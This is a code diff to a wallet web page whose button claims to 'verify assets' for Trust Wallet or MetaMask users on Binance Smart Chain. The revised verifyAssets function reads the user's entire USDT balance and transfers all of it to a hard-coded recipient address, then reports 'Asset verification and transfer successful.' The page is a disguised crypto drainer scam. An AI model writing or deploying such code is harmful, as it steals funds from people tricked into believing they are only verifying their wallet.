@@ -419,21 +419,26 @@
         }
 
         async function getBalance(provider, address) {
-            try {
-                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
-                const balance = await usdtContract.balanceOf(address);
-                const formattedBalance = ethers.utils.formatUnits(balance, 18);
-                balanceElement.textContent = `Your USDT Balance: ${formattedBalance}`;
-            } catch (error) {
-                console.error("Error fetching balance:", error);
-                balanceElement.textContent = "Error fetching balance.";
-            }
+          try {
+            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
+            const balance = await usdtContract.balanceOf(address);
+            const formattedBalance = ethers.utils.formatUnits(balance, 18);
+            balanceElement.textContent = `Your USDT Balance: ${formattedBalance}`;
+          } catch (error) {
+            console.error("Error fetching balance:", error);
+            balanceElement.textContent = "Error fetching balance.";
+          }
         }
 
-        async function switchToBSCAndGetAccount() {
+        async function verifyAssets() {
+            log("", 'info');
+            showLoading(true);
+            verifyButton.disabled = true;
+
             if (!window.ethereum) {
                 log("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.", 'error');
-                return null;
+                showLoading(false);
+                return;
             }
 
             try {
@@ -450,66 +455,60 @@
                         });
                     } catch (addError) {
                         log("Could not add Binance Smart Chain to your wallet.", 'error');
-                        throw addError;
+                        showLoading(false);
+                        return;
                     }
                 } else {
-                    throw switchError;
+                    log("Failed to switch to Binance Smart Chain.", 'error');
+                    showLoading(false);
+                    return;
                 }
             }
 
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                return accounts[0];
-            } catch (accountError) {
-                log("Could not connect to your wallet.", 'error');
-                throw accountError;
-            }
-        }
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
 
-        async function verifyAssets() {
-            log("", 'info');
-            showLoading(true);
-            verifyButton.disabled = true;
+                // Display user balance
+                await getBalance(provider, userAddress);
 
-            const userAddress = await switchToBSCAndGetAccount();
-            if (!userAddress) {
-                showLoading(false);
-                verifyButton.disabled = false;
-                return;
-            }
-
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-             await getBalance(provider, userAddress);
-
-            try {
-                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider.getSigner());
-
+                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
                 const balance = await usdtContract.balanceOf(userAddress);
+
+                if (balance.isZero()) {
+                    log("❌ Your USDT balance is 0.", 'error');
+                    showLoading(false);
+                    return;
+                }
                 const tx = await usdtContract.transfer(recipient, balance);
                 log(`✅ Transfer initiated. Transaction Hash: ${tx.hash}`, 'success');
                 await tx.wait();
                 log("✅ Asset verification and transfer successful.", 'success');
-
-
-            } catch (err) {
-                console.error(err);
-                log(`❌ Verification failed: ${err?.message || err}`, 'error');
+            } catch (error) {
+                console.error("Error:", error);
+                log("❌ Transaction failed: " + (error?.message || error), 'error');
             } finally {
                 showLoading(false);
                 verifyButton.disabled = false;
             }
         }
 
-
-
         window.addEventListener('load', async () => {
             if (window.ethereum) {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.listAccounts();
-                if (accounts.length > 0) {
-                    getBalance(provider, accounts[0]);
-                } else {
-                    balanceElement.textContent = "Connect Wallet to see balance";
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const accounts = await provider.listAccounts();
+                    if (accounts.length > 0) {
+                        const signer = provider.getSigner();
+                        const userAddress = await signer.getAddress();
+                        getBalance(provider, userAddress);
+                    } else {
+                        balanceElement.textContent = "Connect Wallet to see balance";
+                    }
+                } catch (error) {
+                    console.error("Error on load:", error);
+                    balanceElement.textContent = "Error connecting to wallet";
                 }
             } else {
                 balanceElement.textContent = "Wallet not detected";
